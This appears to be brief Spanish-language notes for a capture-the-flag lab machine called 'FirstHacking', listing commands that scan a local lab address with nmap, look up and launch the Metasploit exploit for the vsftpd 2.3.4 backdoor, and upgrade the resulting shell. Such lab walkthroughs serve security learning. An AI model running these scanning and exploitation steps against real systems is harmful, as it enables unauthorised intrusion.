Maquina: FirstHacking
Autor: El Pinguino de Mario 
Dificultad: Muy Facil

ping 172.17.0.2 -c 1
sudo nmap -p- --open -sCV --min-rate 5000 -sS -Pn -n 172.17.0.2 -vvv 
searchsploit vsftpd 2.3.4  
msfconsole -q  
search vsftpd 2.3.4 
use 0
show options
set rhost 172.17.0.2
run
script /dev/null -c bash
whoami